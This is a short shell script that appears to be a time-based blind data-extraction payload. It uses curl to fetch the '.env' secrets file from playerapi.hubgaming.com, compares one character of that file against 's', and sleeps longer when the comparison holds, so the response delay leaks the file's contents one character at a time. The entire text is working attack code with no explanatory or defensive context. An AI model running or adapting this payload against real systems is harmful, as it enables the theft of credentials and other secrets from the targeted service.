#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +22 /wa|head -c1)" < 's' ]&&sleep 25
sleep 12
